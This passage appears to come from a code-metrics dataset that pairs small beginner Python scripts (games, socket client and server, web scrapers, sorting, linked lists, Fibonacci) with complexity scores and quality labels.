    print(""This program merges csv-files to one file\n"")
    merge()


if __name__ == ""__main__"":
    main()
",1025,19,22,15,10,11,0,,7,6,5,13.0,13,,19,59.71535681027101,79.22857502740393,2.5,alto,No,False,False,Low,id328
wordle.py,"# Get all 5 letter words from the full English dictionary
""""""
# dictionary by http://www.gwicks.net/dictionaries.htm
# Load full English dictionary
dictionary = open(""Dictionary.txt"", 'r')
# Load new empty dictionary
new_dictionary = open(""5 letter word dictionary.txt"", ""w"")

# Read the full English dictionary
dictionary_content = dictionary.read()
# Split the full dictionary on every new line
dictionary_content = dictionary_content.split(""\n"") # This returns a list of all the words in the dictionary

# Loop over all the words in the full dictionary
for i in dictionary_content:
    # Check if the current word is 5 characters long
    if len(i) == 5:
        # Write word to the new dictionary
        new_dictionary.write(f""{i}\n"")

# Close out of the new dictionary
new_dictionary.close()
""""""

# import the library random
import random

# Load 5 letter word dictionary
with open(""5 letter word dictionary.txt"", 'r') as dictionary:
    # Read content of dictionary
    dictionary = dictionary.read().split('\n') # This returns a list of all the words in the dictionary

# Choose a random word from the dictionary
word = random.choice(dictionary)

# Get all the unique letters of the word
dif_letters = list(set(word))

# Count how many times each letter occurs in the word
count_letters = {}
for i in dif_letters:
    count_letters[i] = word.count(i)

# Set tries to 0
tries = 0

# Main loop
while True:
    # Check if the user has used all of their tries
    if tries == 6:
        print(f""You did not guess the word!\nThe word was {word}"")
        break
    # Get user input and make it all lower case
    user_inp = input("">>"").lower()

    # Check if user wants to exit the program
    if user_inp == ""q"":
        break

    # Check if the word given by the user is 5 characters long
    if not len(user_inp) == 5:
        print(""Your input must be 5 letters long"")
        continue

    # Check if the word given by the user is in the dictionary
    if not user_inp in dictionary:
        print(""Your word is not in the dictionary"")
        continue

    # Check if the word given by the user is correct
    if user_inp == word:
        print(f""You guessed the word in {tries} tries"")
        break

    # Check guess
    letter = 0
    letter_dict = {}
    letters_checked = []
    return_answer = ""  ""
    for i in word:
        # Check if letter is already checked
        counter = 0
        cont = False
        for g in letters_checked:
            if g == user_inp[letter]:
                counter += 1
                # Check if letter has been checkd more or equal to the ammount of these letters inside of the word
                if counter >= count_letters[i]:
                    cont = True

        # Check if cont is true
        if cont:
            return_answer += ""-""
            letters_checked.append(user_inp[letter])
            letter += 1
            continue


        answer_given = False
        do_not_add = False
        # Check if letter is in word
        if user_inp[letter] in word:
            answer_given = True
            # Check if letter is in the correct position
            if user_inp[letter] == i:
                return_answer += ""G""
            else:
                if not user_inp[word.index(user_inp[letter])] == word[word.index(user_inp[letter])]:
                    return_answer += ""Y""
                else:
                    answer_given = False
                    do_not_add = True

        # Check if there has already been an answer returned
        if not answer_given:
            return_answer += ""-""

        # Append checked letter to the list letters_checked
        if not do_not_add:
           letters_checked.append(user_inp[letter])

        letter += 1

    print(return_answer)

    tries += 1
",3783,62,61,23,24,23,19,0.0,0,23,5,41.0,28,,64,146.2155782920497,322.841223638941,3.6607142857142856,medio,No,True,True,Medium,id329
date-timeclient.py,"import socket

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect((socket.gethostname(), 2905))
recmsg = soc.recv(1024)
soc.close()
print(""The time got from the server is %s"" % recmsg.decode(""ascii""))
",225,6,6,1,0,0,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,No,False,False,Low,id330
date-timeserver.py,"import socket
import time

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind((socket.gethostname(), 2905))
soc.listen(5)
while True:

    clientsocket, addr = soc.accept()

    print(""estavlishes  a connection from %s"" % str(addr))
    currentTime = time.ctime(time.time()) + ""\r\n""
    clientsocket.send(currentTime.encode(""ascii""))
    clientsocket.close()
",388,11,11,3,0,0,0,0.0,0,2,2,,4,,6,10.0,15.509775004326936,1.0,medio,No,False,False,Low,id331
Chrome Dino Automater.py,"import pyautogui  # pip install pyautogui
from PIL import Image, ImageGrab  # pip install pillow

# from numpy import asarray
import time


def hit(key):
    pyautogui.press(key)
    return


def isCollide(data):

    # for cactus
    for i in range(329, 425):
        for j in range(550, 650):
            if data[i, j] < 100:
                hit(""up"")
                return

    # Draw the rectangle for birds
    # for i in range(310, 425):
    #     for j in range(390, 550):
    #         if data[i, j] < 100:
    #             hit(""down"")
    #             return

    # return


if __name__ == ""__main__"":
    print(""Hey.. Dino game about to start in 3 seconds"")
    time.sleep(2)
    # hit('up')

    while True:
        image = ImageGrab.grab().convert(""L"")
        data = image.load()
        isCollide(data)

        # print(aarray(image))

        # Draw the rectangle for cactus
        # for i in range(315, 425):
        #     for j in range(550, 650):
        #         data[i, j] = 0

        # # # # # Draw the rectangle for birds
        # for i in range(310, 425):
        #     for j in range(390, 550):
        #         data[i, j] = 171

        # image.show()
        # break
",1201,19,19,15,23,21,0,2.0,5,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id332
Type_of_angles_of_triangle.py,"# This program will return the type of the triangle.
# User has to enter the angles of the triangle in degrees.


def angle_type():
    angles = []

    myDict = {
        ""All angles are less than 90Â°."": ""Acute Angle Triangle"",
        ""Has a right angle (90Â°)"": ""Right Angle Triangle"",
        ""Has an angle more than 90Â°"": ""Obtuse Angle triangle"",
    }

    print(""**************Enter the angles of your triangle to know it's type*********"")

    # Taking Angle 1

    angle1 = int(input(""Enter angle 1 : ""))

    if angle1 < 180 and angle1 > 0:
        angles.append(angle1)

    else:
        print(""Please enter a value less than 180Â°"")
        angle1 = int(input())
        angles.append(angle1)

    # Taking Angle 2

    angle2 = int(input(""Enter angle2 : ""))

    if angle2 < 180 and angle2 > 0:
        angles.append(angle2)

    else:
        print(""Please enter a value less than 180Â°"")
        angle2 = int(input(""Enter angle 2 :""))
        angles.append(angle2)

    # Taking Angle 3

    angle3 = int(input(""Enter angle3 : ""))

    if angle3 < 180 and angle3 > 0:
        angles.append(angle3)

    else:
        print(""Please enter a value less than 180Â°"")
        angle3 = int(input(""Enter angle3 : ""))
        angles.append(angle3)

    # Answer

    sum_of_angles = angle1 + angle2 + angle3
    if sum_of_angles > 180 or sum_of_angles < 180:
        print(""It is not a triangle!Please enter valid angles."")
        return -1

    print(""You have entered : "" + str(angles))

    if angle1 == 90 or angle2 == 90 or angle3 == 90:
        print(myDict.get(""Has a right angle (90Â°)""))

    elif angle1 < 90 and angle2 < 90 and angle3 < 90:
        print(myDict.get(""All angles are less than 90Â°.""))

    elif angle1 > 90 or angle2 > 90 or angle3 > 90:
        print(myDict.get(""Has an angle more than 90Â°""))


angle_type()
",1848,38,41,24,6,6,0,1.0,18,28,7,58.0,28,35.0,86,154.25742227201613,441.1183394572671,7.25,medio,No,True,False,Medium-High,id333
Palindrome_Checker.py,"""""""

A simple method is , to reverse the string and and compare with original string.
If both are same that's means string is palindrome otherwise else. 
""""""
phrase = input()
if phrase == phrase[::-1]:  # slicing technique
    """"""phrase[::-1] this code is for reverse a string very smartly""""""

    print(""\n Wow!, The phrase is a Palindrome!"")
else:
    print(""\n Sorry, The given phrase is not a Palindrome."")
",411,7,5,2,1,1,4,0.0,0,2,2,3.0,3,,5,6.754887502163469,11.60964047443681,1.0,alto,No,True,False,Low,id334
Tweet Pre-Processing.py,"#!/usr/bin/env python
# coding: utf-8

# In[10]:


import numpy as np
from nltk.corpus import twitter_samples
import matplotlib.pyplot as plt
import random


# In[ ]:


# analysing tweets from the corpus


# In[14]:


positive_tweets = twitter_samples.strings(""positive_tweets.json"")


# In[15]:


negative_tweets = twitter_samples.strings(""negative_tweets.json"")


# In[16]:


all_tweets = positive_tweets + negative_tweets


# In[17]:


# Analysing sampels tweets

print(positive_tweets[random.randint(0, 5000)])


# In[19]:


"""""" There are 4 basic steps in pre-processing of any text 
1.Tokenizing
2.Removing hyper links if any
3.Converting to lower case
4.Removing punctuations
5.steeming of the word""""""


import re
import string

from nltk.corpus import stopwords
from nltk.stem import PorterStemmer
from nltk.tokenize import TweetTokenizer


# In[20]:


# Removing Hyper links

tweet = all_tweets[1]

# removing RT words in the tweet
tweet = re.sub(r""^RT[\s]+"", """", tweet)
# removing hyperlinks in the tweet
tweet = re.sub(r""https?:\/\/.*[\r\n]*"", """", tweet)
# removing #symbol from the tweet
tweet = re.sub(r""#"", """", tweet)

print(tweet)


# In[22]:


# Tokenizing

tokenizer = TweetTokenizer(preserve_case=False, strip_handles=True, reduce_len=True)

tokens = tokenizer.tokenize(tweet)

print(tokens)


# In[23]:


# Remving stop words and punctuation marks

stoper = stopwords.words(""english"")

punct = string.punctuation

print(stoper)
print(punct)


# In[24]:


cleaned = []
for i in tokens:
    if i not in stoper and i not in punct:
        cleaned.append(i)


print(cleaned)


# In[25]:


# stemming

stemmer = PorterStemmer()

processed = []

for i in cleaned:
    st = stemmer.stem(i)
    processed.append(st)

print(processed)


# In[ ]:
",1755,37,36,68,24,24,6,0.0,0,4,3,8.0,7,,12,24.406371956566694,39.86313713864836,1.7142857142857142,alto,No,False,True,,id335
rearrange-files.py,"# author : Avee Chakraborty
# department of software engineering, Daffodil inernational University
# Bangladesh

import os
import shutil


class RearrangeFile(object):
    def __init__(self):
        self.folder_path = os.getcwd()
        self.list_of_all_files = os.listdir(self.folder_path)

    def make_folder_and_return_name(self, foldername):
        if os.path.exists(foldername) is False:
            os.mkdir(foldername)
        else:
            foldername = foldername + str(2)
            os.mkdir(foldername)
        return foldername

    def check_folder_existance(self):
        for i in range(len(self.list_of_all_files)):
            if self.list_of_all_files[i].endswith("".pdf""):
                if os.path.exists(""pdfs""):
                    shutil.move(
                        self.folder_path + ""/"" + self.list_of_all_files[i],
                        self.folder_path + ""/pdfs"",
                    )
                else:
                    os.mkdir(""pdfs"")

            elif self.list_of_all_files[i].endswith(""jpg""):
                if os.path.exists(""jpgs""):
                    shutil.move(
                        self.folder_path + ""/"" + self.list_of_all_files[i],
                        self.folder_path + ""/jpgs"",
                    )
                else:
                    os.mkdir(""jpgs"")


if __name__ == ""__main__"":
    re = RearrangeFile()
    re.check_folder_existance()
",1416,28,34,8,3,3,0,3.0,13,9,3,18.0,14,,27,58.05785641096992,110.36149671375918,1.9285714285714288,medio,Yes,False,False,Low,id336
mobilePhoneSpecsScrapper.py,"import requests
from bs4 import BeautifulSoup

# import csv
import os

# import time
import json


class Phonearena:
    def __init__(self):
        self.phones = []
        self.features = [""Brand"", ""Model Name"", ""Model Image""]
        self.temp1 = []
        self.phones_brands = []
        self.url = ""https://www.phonearena.com/phones/""  # GSMArena website url
        # Folder name on which files going to save.
        self.new_folder_name = ""GSMArenaDataset""
        # It create the absolute path of the GSMArenaDataset folder.
        self.absolute_path = os.getcwd().strip() + ""/"" + self.new_folder_name

    def crawl_html_page(self, sub_url):

        url = sub_url  # Url for html content parsing.

        # Handing the connection error of the url.
        try:
            page = requests.get(url)
            # It parses the html data from requested url.
            soup = BeautifulSoup(page.text, ""html.parser"")
            return soup

        except ConnectionError as err:
            print(""Please check your network connection and re-run the script."")
            exit()

        except Exception:
            print(""Please check your network connection and re-run the script."")
            exit()

    def crawl_phone_urls(self):
        phones_urls = []
        for i in range(1, 238):  # Right now they have 237 page of phone data.
            print(self.url + ""page/"" + str(i))
            soup = self.crawl_html_page(self.url + ""page/"" + str(i))
            table = soup.findAll(""div"", {""class"": ""stream-item""})
            table_a = [k.find(""a"") for k in table]
            for a in table_a:
                temp = a[""href""]
                phones_urls.append(temp)
        return phones_urls

    def crawl_phones_models_specification(self, li):
        phone_data = {}
        for link in li:
            print(link)
            try:
                soup = self.crawl_html_page(link)
                model = soup.find(class_=""page__section page__section_quickSpecs"")
                model_name = model.find(""header"").h1.text
                model_img_html = model.find(class_=""head-image"")
                model_img = model_img_html.find(""img"")[""data-src""]
                specs_html = model.find(
                    class_=""phone__section phone__section_widget_quickSpecs""
                )
                release_date = specs_html.find(class_=""calendar"")
                release_date = release_date.find(class_=""title"").p.text
                display = specs_html.find(class_=""display"")
                display = display.find(class_=""title"").p.text
                camera = specs_html.find(class_=""camera"")
                camera = camera.find(class_=""title"").p.text
                hardware = specs_html.find(class_=""hardware"")
                hardware = hardware.find(class_=""title"").p.text
                storage = specs_html.find(class_=""storage"")
                storage = storage.find(class_=""title"").p.text
                battery = specs_html.find(class_=""battery"")
                battery = battery.find(class_=""title"").p.text
                os = specs_html.find(class_=""os"")
                os = os.find(class_=""title"").p.text
                phone_data[model_name] = {
                    ""image"": model_img,
                    ""release_date"": release_date,
                    ""display"": display,
                    ""camera"": camera,
                    ""hardware"": hardware,
                    ""storage"": storage,
                    ""battery"": battery,
                    ""os"": os,
                }
                with open(obj.absolute_path + ""-PhoneSpecs.json"", ""w+"") as of:
                    json.dump(phone_data, of)
            except Exception as error:
                print(f""Exception happened : {error}"")
                continue
        return phone_data


if __name__ == ""__main__"":
    obj = Phonearena()
    try:
        # Step 1: Scrape links to all the individual phone specs page and save it so that we don't need to run it again.
        phone_urls = obj.crawl_phone_urls()
        with open(obj.absolute_path + ""-Phoneurls.json"", ""w"") as of:
            json.dump(phone_urls, of)

        # Step 2: Iterate through all the links from the above execution and run the next command
        with open(""obj.absolute_path+'-Phoneurls.json"", ""r"") as inp:
            temp = json.load(inp)
            phone_specs = obj.crawl_phones_models_specification(temp)

    except KeyboardInterrupt:
        print(""File has been stopped due to KeyBoard Interruption."")
",4529,81,90,15,11,8,0,4.0,15,9,2,18.0,16,,27,66.0,112.58797503894245,1.125,medio,Yes,False,False,Low,id337
slow-motion.py,"# author : Avee Chakraborty
# Department of software engineering, Diu
# Bangladesh

import cv2

capture = cv2.VideoCapture(0)
fourcc = cv2.VideoWriter_fourcc(*""XVID"")
output = cv2.VideoWriter(""slowmotion.mp4"", fourcc, 5, (640, 480))

while True:
    ret, frame = capture.read()
    output.write(frame)
    cv2.imshow(""frame"", frame)
    if cv2.waitKey(1) & 0xFF == ord(""x""):
        break

capture.release()
output.release()
cv2.destroyAllWindows()
",449,13,13,4,3,3,0,0.0,0,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id338
TkinterUI.py,"import tkinter as tk
from tkinter.font import Font
from tkinter import messagebox
from tkinter import filedialog
from ThirdAI import NeuralDBClient as Ndb


class ThirdAIApp:
    """"""
    A GUI application for using the ThirdAI neural database client to train and query data.
    """"""
    def __init__(self, root):
        """"""
        Initialize the user interface window.

        Args:
            root (tk.Tk): The main Tkinter window.
        """"""
        # Initialize the main window
        self.root = root
        self.root.geometry(""600x500"")
        self.root.title('ThirdAI - T&C')

        # Initialize variables
        self.path = []
        self.client = Ndb()

        # GUI elements

        # Labels and buttons
        self.menu = tk.Label(self.root, text=""Terms & Conditions"", font=self.custom_font(30), fg='black',
                             highlightthickness=2, highlightbackground=""red"")
        self.menu.place(x=125, y=10)

        self.insert_button = tk.Button(self.root, text=""Insert File!"", font=self.custom_font(15), fg='black', bg=""grey"",
                                       width=10, command=self.file_input)
        self.insert_button.place(x=245, y=100)

        self.text_box = tk.Text(self.root, wrap=tk.WORD, width=30, height=1)
        self.text_box.place(x=165, y=150)

        self.training_button = tk.Button(self.root, text=""Training"", font=self.custom_font(15), fg='black', bg=""grey"",
                                         width=10, command=self.training)
        self.training_button.place(x=245, y=195)

        self.query_label = tk.Label(self.root, text=""Query"", font=self.custom_font(20), fg='black')
        self.query_label.place(x=255, y=255)

        self.query_entry = tk.Entry(self.root, font=self.custom_font(20), width=30)
        self.query_entry.place(x=70, y=300)

        self.processing_button = tk.Button(self.root, text=""Processing"", font=self.custom_font(15), fg='black',
                                           bg=""grey"", width=10, command=self.processing)
        self.processing_button.place(x=245, y=355)

        self.clear_button = tk.Button(self.root, text=""Clear"", font=15, fg='black', bg=""grey"", width=10,
                                      command=self.clear_all)
        self.clear_button.place(x=245, y=405)

    @staticmethod
    def custom_font(size):
        """"""
        Create a custom font with the specified size.

        Args:
            size (int): The font size.

        Returns:
            Font: The custom Font object.
        """"""
        return Font(size=size)

    def file_input(self):
        """"""
        Open a file dialog to select a PDF file and display its name in the text box.
        """"""
        file_type = dict(defaultextension="".pdf"", filetypes=[(""pdf file"", ""*.pdf"")])
        file_path = filedialog.askopenfilename(**file_type)

        if file_path:
            self.path.append(file_path)
            file_name = file_path.split(""/"")[-1]
            self.text_box.delete(1.0, tk.END)
            self.text_box.insert(tk.INSERT, file_name)

    def clear_all(self):
        """"""
        Clear the query entry, text box, and reset the path.
        """"""
        self.query_entry.delete(0, tk.END)
        self.text_box.delete(1.0, tk.END)
        self.path.clear()

    def training(self):
        """"""
        Train the neural database client with the selected PDF file.
        """"""
        if not self.path:
            messagebox.showwarning(""No File Selected"", ""Please select a PDF file before training."")
            return

        self.client.train(self.path[0])

        messagebox.showinfo(""Training Complete"", ""Training is done!"")

    def processing(self):
        """"""
        Process a user query and display the output in a new window.
        """"""
        question = self.query_entry.get()

        # When there is no query submitted by the user
        if not question:
            messagebox.showwarning(""No Query"", ""Please enter a query."")
            return

        output = self.client.query(question)
        self.display_output(output)

    def display_output(self, output_data):
        """"""
        Display the output data in a new window.

        Args:
            output_data (str): The output text to be displayed.
        """"""
        output_window = tk.Toplevel(self.root)
        output_window.title(""Output Data"")
        output_window.geometry(""500x500"")

        output_text = tk.Text(output_window, wrap=tk.WORD, width=50, height=50)
        output_text.pack(padx=10, pady=10)
        output_text.insert(tk.END, output_data)


if __name__ == ""__main__"":
    """"""
    Initializing the main application window
    """"""

    # Calling the main application window
    win = tk.Tk()
    app = ThirdAIApp(win)
    win.mainloop()
",4769,76,72,31,6,6,35,7.0,12,4,3,5.0,5,8.0,9,16.36452797660028,27.0,1.5,medio,Yes,False,False,Low,id339
googleweb.py,"from fuzzywuzzy import fuzz
import bs4, requests
import numpy as np
import pandas as pd
import os
requests.packages.urllib3.disable_warnings()
FinalResult=[]
def SearchResults():
    lis = []
    f = open(""Input"", ""r"")
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
    StabUrl = ""https://www.google.com/search?rlz=1C1CHBD_enIN872IN872&sxsrf=ALeKk03OHYAnSxX60oUwmblKn36Hyi8MhA%3A1600278715451&ei=u1BiX9ibG7qU4-EP_qGPgA8&q=""
    midUrl = ""&oq=""
    EndUrl = ""&gs_lcp=CgZwc3ktYWIQAzoECAAQR1C11AxYtdQMYJXcDGgAcAF4AIABpQKIAaUCkgEDMi0xmAEAoAECoAEBqgEHZ3dzLXdpesgBCMABAQ&sclient=psy-ab&ved=0ahUKEwiY5YDjnu7rAhU6yjgGHf7QA_AQ4dUDCA0&uact=5""
    for i in f:
        singleLink=[]
        singleRatio=[]
        singleWrite=[]
        singleWrite.append(i.strip(""\n""))
        checkString=i.replace(""+"","""")
        searchString=i.replace(""+"",""%2B"")
        searchString=searchString.replace("" "",""+"")
        searchString=StabUrl+searchString+midUrl+searchString+EndUrl
        r = requests.get(searchString, headers=header)
        soup = bs4.BeautifulSoup(r.text, features=""html.parser"")
        elements = soup.select("".r a"")
        for g in elements:
            lis.append(g.get(""href""))
        for k in lis:
            sentence=""""
            if (k[0] != ""#"") and k[0] != ""/"":
                checker = k[8:16]
                if (checker != ""webcache""):
                    rr = requests.get(k, headers=header, verify=False)
                    soupInside = bs4.BeautifulSoup(rr.text, features=""html.parser"")
                    elementInside=soupInside.select(""body"")
                    for line in elementInside:
                        sentence=sentence+line.text
                    ratio=fuzz.token_set_ratio(sentence,checkString)
                    if(ratio>80):
                        singleLink.append(k)
                        singleRatio.append(ratio)
        if(len(singleLink)>=4):
            singleLink=np.array(singleLink)
            singleRatio=np.array(singleRatio)
            inds=singleRatio.argsort()
            sortedLink=singleLink[inds]
            sortedFinalList=list(sortedLink[::-1])
            sortedFinalList=sortedFinalList[:4]
            FinalResult.append(singleWrite+sortedFinalList)
        elif(len(singleLink)<4) and len(singleLink)>0:
            singleLink = np.array(singleLink)
            singleRatio = np.array(singleRatio)
            inds = singleRatio.argsort()
            sortedLink = singleLink[inds]
            sortedFinalList = list(sortedLink[::-1])
            sortedFinalList=sortedFinalList+(4-len(sortedFinalList))*[["" ""]]
            FinalResult.append(singleWrite + sortedFinalList)
        else:
            sortedFinalList=[["" ""]]*4
            FinalResult.append(singleWrite+sortedFinalList)


SearchResults()
FinalResult=np.array(FinalResult)
FinalResult=pd.DataFrame(FinalResult)
FinalResult.columns=[""Input"",""Link A"",""Link B"",""Link C"",""Link D""]
FinalResult.replace("" "",np.nan)
FinalResult.to_csv(""Susma.csv"",index=False)
print(FinalResult)
",3127,73,69,2,0,0,0,1.0,12,23,9,44.0,34,,67,201.5030616154924,363.55973856504056,5.823529411764706,bajo,No,False,False,Medium-High,id340
oneeven.py,"# Python Program to Print Even Numbers from 1 to N

maximum = int(input("" Please Enter the Maximum Value : ""))

number = 1

while number <= maximum:
    if number % 2 == 0:
        print(""{0}"".format(number))
    number = number + 1
",233,6,6,3,1,1,0,0.0,0,4,4,8.0,6,,12,23.509775004326936,39.86313713864836,2.6666666666666665,alto,No,True,False,Low,id341
dir_test.py,"# Script Name		: dir_test.py
# Author				: Craig Richards
# Created				: 29th November 2011
# Last Modified		: by- Joshua Covington 05 Oct 2020
# Version				: 1.0
# Modifications		:

# Description			: Tests to see if the directory testdir exists, if not it will create the directory for you if you want it created.
from __future__ import print_function

import os

try:
    input = raw_input()
except NameError:
    pass


def main():
    CheckDir = input(""Enter the name of the directory to check : "")
    print()

    if os.path.exists(CheckDir):  # Checks if the dir exists
        print(""The directory exists"")
    else:
        print(""No directory found for "" + CheckDir)  # Output if no directory
        print()
        option = input(""Would you like this directory create? y/n: "")
        if option == ""n"":
            print(""Goodbye"")
            exit()
        if option == ""y"":
            os.makedirs(CheckDir)  # Creates a new dir for the given name
            print(""Directory created for "" + CheckDir)
        else:
            print(""Not an option. Exiting"")
            exit()


if __name__ == ""__main__"":
    main()
",1135,26,26,8,10,7,0,1.0,4,5,2,10.0,8,,15,26.0,49.82892142331044,1.25,alto,No,True,False,Low,id342
insertion_sort.py,"def insertion_sort(nums):
    # Start on the second element as we assume the first element is sorted
    for i in range(1, len(nums)):
        item_to_insert = nums[i]
        # And keep a reference of the index of the previous element
        j = i - 1
        # Move all items of the sorted segment forward if they are larger than
        # the item to insert
        while j >= 0 and nums[j] > item_to_insert:
            nums[j + 1] = nums[j]
            j -= 1
        # Insert the item
        nums[j + 1] = item_to_insert


# Verify it works
random_list_of_nums = [9, 1, 15, 28, 6]
insertion_sort(random_list_of_nums)
print(random_list_of_nums)
",652,11,11,2,6,6,0,1.0,4,7,5,14.0,8,13.0,21,35.60964047443681,77.70923408096293,4.375,alto,No,False,False,Low,id343
rook.py,"start = [0, 0]
end = [7, 7]
taken = [[1, 0], [1, 1], [1, 2], [1, 3]]
queue = []
queue.append([start[0], start[1], -1])
visited = []
maze = []
for i in range(8):
    maze.append([""."", ""."", ""."", ""."", ""."", ""."", ""."", "".""])
    visited.append([0, 0, 0, 0, 0, 0, 0, 0])
maze[start[0]][start[1]] = ""S""
maze[end[0]][end[1]] = ""E""
for i in taken:
    maze[i[0]][i[1]] = ""X""
while len(queue) > 0:
    point = queue.pop(0)
    if end[0] == point[0] and end[1] == point[1]:
        print(point[2] + 1)
        break
    current = point[2] + 1
    if point not in taken and visited[point[0]][point[1]] == 0:
        visited[point[0]][point[1]] = current
        for i in range(point[0], -1, -1):
            if [i, point[1]] in taken:
                break
            if visited[i][point[1]] == 0:
                queue.append([i, point[1], current])
        for i in range(point[0], 8):
            if [i, point[1]] in taken:
                break
            if visited[i][point[1]] == 0:
                queue.append([i, point[1], current])
        for i in range(point[1], -1, -1):
            if [point[0], i] in taken:
                break
            if visited[point[0]][i] == 0:
                queue.append([point[0], i, current])
        for i in range(point[1], 8):
            if [point[0], i] in taken:
                break
            if visited[point[0]][i] == 0:
                queue.append([point[0], i, current])

for i in maze:
    for j in i:
        print(j, end=""   "")
    print()
",1495,46,46,1,0,0,0,0.0,0,22,7,39.0,24,,61,129.690584471711,302.2059749335994,5.6875,bajo,No,False,False,Medium,id344
Delete_Linked_List.py,"class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


class Linked_List:
    def __init__(self):
        self.head = None

    def Insert_At_End(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        current = self.head
        while current.next:
            current = current.next
        current.next = new_node

    def Delete(self, key):
        temp = self.head
        if temp is None:
            return ""Can't Delete!""
        else:
            if temp.data == key:
                self.head = temp.next
                temp = None
        while temp is not None:
            prev = temp
            temp = temp.next
            curr = temp.next
            if temp.data == key:
                prev.next = curr
                return

    def Display(self):
        temp = self.head
        while temp:
            print(temp.data, ""->"", end="" "")
            temp = temp.next
        print(""None"")


if __name__ == ""__main__"":
    L_list = Linked_List()
    L_list.Insert_At_End(1)
    L_list.Insert_At_End(2)
    L_list.Insert_At_End(3)
    L_list.Insert_At_End(4)
    L_list.Insert_At_End(5)
    L_list.Insert_At_End(6)
    L_list.Insert_At_End(7)
    print(""Linked List: "")
    L_list.Display()
    print(""Deleted Linked List: "")
    L_list.Delete(3)
    L_list.Display()
",1469,51,51,7,0,0,0,5.0,18,6,3,12.0,8,,18,28.75488750216347,62.26976913547136,2.25,bajo,Yes,False,False,Low,id345
fibonacci.py,"# Fibonacci tool
# This script only works with Python3!

import time


def getFibonacciIterative(n: int) -> int:
    """"""
    Calculate the fibonacci number at position n iteratively
    """"""

    a = 0
    b = 1

    for _ in range(n):
        a, b = b, a + b

    return a


def getFibonacciRecursive(n: int) -> int:
    """"""
    Calculate the fibonacci number at position n recursively
    """"""

    a = 0
    b = 1

    def step(n: int) -> int:
        nonlocal a, b
        if n <= 0:
            return a
        a, b = b, a + b
        return step(n - 1)

    return step(n)


def getFibonacciDynamic(n: int, fib: list) -> int:
    """"""
    Calculate the fibonacci number at position n using dynamic programming to improve runtime
    """"""

    if n == 0 or n == 1:
        return n
    if fib[n] != -1:
        return fib[n]
    fib[n] = getFibonacciDynamic(n - 1, fib) + getFibonacciDynamic(n - 2, fib)
    return fib[n]


def main():
    n = int(input())
    fib = [-1] * n
    getFibonacciDynamic(n, fib)


def compareFibonacciCalculators(n: int) -> None:
    """"""
    Interactively compare both fibonacci generators
    """"""

    startI = time.clock()
    resultI = getFibonacciIterative(n)
    endI = time.clock()

    startR = time.clock()
    resultR = getFibonacciRecursive(n)
    endR = time.clock()

    s = ""{} calculting {} => {} in {} seconds""
    print(s.format(""Iteratively"", n, resultI, endI - startI))
    print(s.format(""Recursively"", n, resultR, endR - startR))
",1481,42,38,21,2,2,12,6.0,9,16,8,30.0,24,,46,134.03910001730776,230.0,5.0,medio,No,True,False,Medium,id346
client.py,"# Note :- Client and Server Must be connected to same Network
# import socket  modules
import socket

# create TCP/IP socket
s = socket.socket()
# take user input ip of server
server = input(""Enter Server IP: "")
# bind the socket to the port 12345, and connect
s.connect((server, 12345))
# receive message from server connection successfully established
data = s.recv(1024).decode(""utf-8"")
print(server + "": "" + data)

while True:
    # send message to server
    new_data = str(input(""You: "")).encode(""utf-8"")
    s.sendall(new_data)
    # receive message from server
    data = s.recv(1024).decode(""utf-8"")
    print(server + "": "" + data)

# close connection
s.close()
",671,12,12,3,9,9,0,0.0,0,4,1,8.0,5,,12,11.60964047443681,31.019550008653876,0.8,alto,No,True,False,Low,id347
Type of angles of a triangle.py,"# This program will return the type of the triangle.
# User has to enter the angles of the triangle in degrees.
def angle_type():
    angles = []

    myDict = {
        ""All angles are less than 90Â°."": ""Acute Angle Triangle"",
        ""Has a right angle (90Â°)"": ""Right Angle Triangle"",
        ""Has an angle more than 90Â°"": ""Obtuse Angle triangle"",
    }

    print(""**************Enter the angles of your triangle to know it's type*********"")

    angle1 = int(input(""Enter angle1 : ""))
    if angle1 < 180 and angle1 > 0:
        angles.append(angle1)
    else:
        print(""Please enter a value less than 180Â°"")
        angle1 = int(input())
        angles.append(angle1)

    angle2 = int(input(""Enter angle2 : ""))
    if angle2 < 180 and angle2 > 0:
        angles.append(angle2)
    else:
        print(""Please enter a value less than 180Â°"")
        angle2 = int(input())
        angles.append(angle2)

    angle3 = int(input(""Enter angle3 : ""))
    if angle3 < 180 and angle3 > 0:
        angles.append(angle3)
    else:
        print(""Please enter a value less than 180Â°"")
        angle3 = int(input())
        angles.append(angle3)

    sum_of_angles = angle1 + angle2 + angle3
    if sum_of_angles > 180 or sum_of_angles < 180:
        print(""It is not a triangle!Please enter valid angles."")
        return -1

    print(""You have entered : "" + str(angles))

    if angle1 >= 90 or angle2 >= 90 or angle3 >= 90:
        print(myDict.get(""Has a right angle (90Â°)""))

    elif angle1 < 90 and angle2 < 90 and angle3 < 90:
        print(myDict.get(""All angles are less than 90Â°.""))

    elif angle1 > 90 or angle2 > 90 or angle3 > 90:
        print(myDict.get(""Has an angle more than 90Â°""))


angle_type()
",1725,38,41,12,2,2,0,1.0,18,28,7,58.0,28,,86,154.25742227201613,441.1183394572671,7.25,medio,No,True,False,Medium-High,id348
pythagoreanTriplets.py,"limit = int(input(""Enter upper limit:""))
c = 0
m = 2
while c < limit:
    for n in range(1, m + 1):
        a = m * m - n * n
        b = 2 * m * n
        c = m * m + n * n
        if c > limit:
            break
        if a == 0 or b == 0 or c == 0:
            break
        print(a, b, c)
    m = m + 1
",308,14,14,0,0,0,0,0.0,0,16,7,33.0,17,,49,89.13835275565901,224.66316253533668,6.794117647058823,medio,No,True,False,Medium,id349
cat.py,"""""""
The 'cat' Program Implemented in Python 3

The Unix 'cat' utility reads the contents
of file(s) specified through stdin and 'conCATenates'
into stdout. If it is run without any filename(s) given,
then the program reads from standard input itself,
which means it simply copies stdin to stdout.

It is fairly easy to implement such a program
in Python, and as a result countless examples
exist online. This particular implementation
focuses on the basic functionality of the cat
utility. Compatible with Python 3.6 or higher.

Syntax:
